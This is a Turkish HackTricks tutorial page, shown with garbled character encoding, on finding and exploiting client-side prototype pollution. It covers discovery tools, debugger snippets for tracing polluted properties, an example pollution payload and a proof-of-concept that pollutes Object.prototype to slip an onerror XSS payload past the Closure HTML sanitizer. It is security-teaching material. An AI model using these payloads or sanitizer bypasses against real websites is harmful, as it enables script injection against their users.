# Ä°stemci TarafÄ± Prototype KirliliÄŸi

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman seviyesine Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

## Otomatik AraÃ§lar Kullanarak KeÅŸfetme

[**https://github.com/dwisiswant0/ppfuzz**](https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0)**,** [**https://github.com/kleiton0x00/ppmap**](https://github.com/kleiton0x00/ppmap) **ve** [**https://github.com/kosmosec/proto-find**](https://github.com/kosmosec/proto-find) araÃ§larÄ±, **prototype kirliliÄŸi aÃ§Ä±klarÄ±nÄ± bulmak** iÃ§in kullanÄ±labilir.

AyrÄ±ca, **tarayÄ±cÄ± eklentisi** [**PPScan**](https://github.com/msrkp/PPScan) kullanarak **eriÅŸtiÄŸiniz sayfalarÄ± otomatik olarak** **taramanÄ±z** da mÃ¼mkÃ¼ndÃ¼r.

### Bir Ã¶zelliÄŸin kullanÄ±ldÄ±ÄŸÄ± yeri hata ayÄ±klama <a href="#5530" id="5530"></a>

{% code overflow="wrap" %}
```javascript
// Stop debugger where 'potentialGadget' property is accessed
Object.defineProperty(Object.prototype,'potentialGadget', {__proto__:null, get(){
console.trace();
return 'test';
}})
```
{% endcode %}

### Prototype KirliliÄŸinin KÃ¶k Nedenini Bulma <a href="#5530" id="5530"></a>

Herhangi bir araÃ§ tarafÄ±ndan bir prototype kirliliÄŸi aÃ§Ä±ÄŸÄ± tespit edildiÄŸinde ve kod Ã§ok karmaÅŸÄ±k deÄŸilse, Chrome GeliÅŸtirici AraÃ§larÄ±'nda `location.hash`, `decodeURIComponent` veya `location.search` gibi anahtar kelimeleri aratarak aÃ§Ä±ÄŸÄ± bulabilirsiniz. Bu yaklaÅŸÄ±m, JavaScript kodunun savunmasÄ±z bÃ¶lÃ¼mÃ¼nÃ¼ belirlemenizi saÄŸlar.

Daha bÃ¼yÃ¼k ve karmaÅŸÄ±k kod tabanlarÄ± iÃ§in, savunmasÄ±z kodu keÅŸfetmek iÃ§in aÅŸaÄŸÄ±daki adÄ±mlarÄ± izleyen basit bir yÃ¶ntem kullanÄ±lÄ±r:

1. Bir araÃ§ kullanarak bir aÃ§Ä±ÄŸÄ± tespit edin ve bir Ã¶zelliÄŸi constructor iÃ§inde ayarlamak iÃ§in tasarlanmÄ±ÅŸ bir payload elde edin. ppmap tarafÄ±ndan saÄŸlanan bir Ã¶rnek ÅŸu ÅŸekilde olabilir: `constructor[prototype][ppmap]=reserved`.
2. Sayfada Ã§alÄ±ÅŸacak olan JavaScript kodunun ilk satÄ±rÄ±nda bir kesme noktasÄ± ayarlayÄ±n. Payload ile sayfayÄ± yenileyerek, bu kesme noktasÄ±nda yÃ¼rÃ¼tmeyi duraklatÄ±n.
3. JavaScript yÃ¼rÃ¼tmesi duraklatÄ±ldÄ±ÄŸÄ±nda, aÅŸaÄŸÄ±daki betiÄŸi JS konsolunda Ã§alÄ±ÅŸtÄ±rÄ±n. Bu betik, 'ppmap' Ã¶zelliÄŸi oluÅŸturulduÄŸunda sinyal verecek ve kÃ¶kenini bulmada yardÄ±mcÄ± olacaktÄ±r:
```javascript
function debugAccess(obj, prop, debugGet=true){

var origValue = obj[prop];

Object.defineProperty(obj, prop, {
get: function () {
if (debugGet)
debugger;
return origValue;
},
set: function(val) {
debugger;
origValue = val;
}
});

};

debugAccess(Object.prototype, 'ppmap')
```
4. **Kaynaklar** sekmesine geri dÃ¶nÃ¼n ve "Script yÃ¼rÃ¼tmesini devam ettir" seÃ§eneÄŸini seÃ§in. JavaScript yÃ¼rÃ¼tmeye devam edecek ve 'ppmap' Ã¶zelliÄŸi beklenildiÄŸi gibi kirlenecektir. SaÄŸlanan kod parÃ§acÄ±ÄŸÄ± kullanÄ±larak 'ppmap' Ã¶zelliÄŸinin kirlendiÄŸi tam konumun tespit edilmesi kolaylaÅŸÄ±r. **Ã‡aÄŸrÄ± YÄ±ÄŸÄ±nÄ±**'nÄ± inceleyerek, kirlenmenin meydana geldiÄŸi farklÄ± yÄ±ÄŸÄ±nlar gÃ¶zlemlenebilir.

Hangi yÄ±ÄŸÄ±nÄ± araÅŸtÄ±racaÄŸÄ±nÄ±zÄ± belirlerken, genellikle prototype kirlenmesinin sÄ±kÃ§a bu kÃ¼tÃ¼phanelerde meydana geldiÄŸi yÄ±ÄŸÄ±nlarÄ± hedeflemek faydalÄ± olur. SaÄŸ tarafta (rehberlik iÃ§in saÄŸlanan bir resim gibi) kÃ¼tÃ¼phane dosyalarÄ±na baÄŸlÄ± olan ilgili yÄ±ÄŸÄ±nÄ± belirleyerek bulun. 4. ve 6. satÄ±rlardaki gibi birden fazla yÄ±ÄŸÄ±n senaryolarÄ±nda, kirlenmenin ilk meydana geldiÄŸi ve dolayÄ±sÄ±yla zayÄ±flÄ±ÄŸÄ±n kÃ¶k nedeni olan 4. satÄ±rdaki yÄ±ÄŸÄ±n mantÄ±klÄ± bir seÃ§imdir. YÄ±ÄŸÄ±nÄ± tÄ±klamak, zayÄ±f kodun bulunduÄŸu yere yÃ¶nlendirecektir.

![https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg](https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg)

## Script Gadget'larÄ±nÄ± Bulma

Gadget, bir PP zafiyeti keÅŸfedildiÄŸinde **istismar edilecek kod parÃ§acÄ±ÄŸÄ±dÄ±r**.

Uygulama basitse, **`srcdoc/innerHTML/iframe/createElement`** gibi **anahtar kelimeleri arayabiliriz** ve kaynak kodunu inceleyerek **javascript yÃ¼rÃ¼tmesine yol aÃ§Ä±p aÃ§madÄ±ÄŸÄ±nÄ±** kontrol edebiliriz. Bazen, bahsi geÃ§en teknikler hiÃ§ gadget bulamayabilir. Bu durumda, saf kaynak kod incelemesi aÅŸaÄŸÄ±daki Ã¶rnekte olduÄŸu gibi bazÄ± gÃ¼zel gadget'larÄ± ortaya Ã§Ä±karÄ±r.

### Mithil kÃ¼tÃ¼phane kodunda PP gadget'Ä±nÄ± bulma Ã¶rneÄŸi

Bu yazÄ±ya gÃ¶z atÄ±n: [https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)

## Hassas kÃ¼tÃ¼phaneler iÃ§in payload'larÄ±n yeniden derlenmesi

* [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
* [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

## PP ile HTML Temizleyicilerin atlatÄ±lmasÄ±

[**Bu araÅŸtÄ±rma**](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) bazÄ± HTML temizleyici kÃ¼tÃ¼phaneler tarafÄ±ndan saÄŸlanan temizlemeleri atlatmak iÃ§in kullanÄ±labilecek PP gadget'larÄ±nÄ± gÃ¶stermektedir:

* #### sanitize-html

<figure><img src="../../../.gitbook/assets/image (668).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-7.png"><figcaption></figcaption></figure>

* #### dompurify

<figure><img src="../../../.gitbook/assets/image (669).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-9.png"><figcaption></figcaption></figure>

* #### Closure
```html
<!-- from https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/ -->
<script>
Object.prototype['* ONERROR'] = 1;
Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
goog.require('goog.html.sanitizer.HtmlSanitizer');
goog.require('goog.dom');
</script>
<body>
<script>
const html = '<img src onerror=alert(1)>';
const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
const sanitized = sanitizer.sanitize(html);
const node = goog.dom.safeHtmlToNode(sanitized);

document.body.append(node);
</script>
```
## Referanslar

* [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
* [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
* [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

<details>

<summary><strong>AWS hackleme konusunda sÄ±fÄ±rdan kahramana dÃ¶nÃ¼ÅŸmek iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>'Ä± Ã¶ÄŸrenin!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek veya HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
